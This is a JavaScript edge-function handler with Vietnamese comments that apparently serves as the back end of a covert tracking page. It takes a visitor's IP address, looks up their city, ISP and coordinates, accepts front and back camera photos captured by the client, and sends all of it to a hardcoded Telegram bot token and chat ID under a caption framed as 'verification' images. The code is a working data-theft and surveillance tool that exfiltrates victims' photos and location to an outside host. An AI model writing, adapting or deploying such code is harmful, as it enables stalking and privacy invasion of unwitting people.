export const config = { runtime: "edge" };

export default async function handler(req) {
  const TOKEN = "8962152623:AAH2gxqS-QXfs_bYaHHwoPG6xv7pWJXLSmY";
  const CHAT_ID = 8523959891;

  if (req.method !== "POST")
    return new Response("Method Not Allowed", { status: 405 });

  try {
    // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ TỪ SERVER
    const userIP =
      req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
    
    let geo = {};
    try {
      const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
      geo = await geoRes.json();
    } catch (e) {
      geo = {};
    }

    const lat = geo.latitude || "0";
    const lon = geo.longitude || "0";
    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;

    // 2. NHẬN DỮ LIỆU TỪ CLIENT
    const contentType = req.headers.get("content-type") || "";
    let clientData = {};
    let formData = null;

    if (contentType.includes("multipart/form-data")) {
      formData = await req.formData();
      clientData = JSON.parse(formData.get("clientInfo") || "{}");
    } else {
      clientData = await req.json();
    }

    const hasFront = formData && formData.has("front");
    const hasBack = formData && formData.has("back");

    // 3. TẠO CAPTION THÔNG TIN
    const finalCaption = `
📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]

🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
📱 Thiết bị: ${clientData.device || "Unknown"}
🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
🌍 IP dân cư: ${userIP}
🏢 ISP: ${geo.asName || "VNNIC"}
🏙️ Địa chỉ: ${address}
🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
📍 Vĩ độ: ${lat}
📍 Kinh độ: ${lon}
📌 Google Maps: http://googleusercontent.com/maps.google.com/${lat},${lon}
📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}

⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
`.trim();

    // 4. GỬI ĐẾN TELEGRAM
    if (hasFront || hasBack) {
      // Gửi Album ảnh kèm caption nếu chụp được ảnh
      const teleForm = new FormData();
      teleForm.append("chat_id", CHAT_ID);

      const media = [];

      if (hasFront) {
        media.push({
          type: "photo",
          media: "attach://front",
          caption: finalCaption,
        });
        teleForm.append("front", formData.get("front"));
      }

      if (hasBack) {
        media.push({
          type: "photo",
          media: "attach://back",
          caption: !hasFront ? finalCaption : undefined,
        });
        teleForm.append("back", formData.get("back"));
      }

      teleForm.append("media", JSON.stringify(media));

      const res = await fetch(
        `https://api.telegram.org/bot${TOKEN}/sendMediaGroup`,
        {
          method: "POST",
          body: teleForm,
        },
      );
      return new Response(await res.text(), { status: 200 });
    } else {
      // Gửi tin nhắn văn bản nếu không bắt được ảnh
      const res = await fetch(
        `https://api.telegram.org/bot${TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: finalCaption,
          }),
        },
      );
      return new Response(await res.text(), { status: 200 });
    }
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500,
    });
  }
}
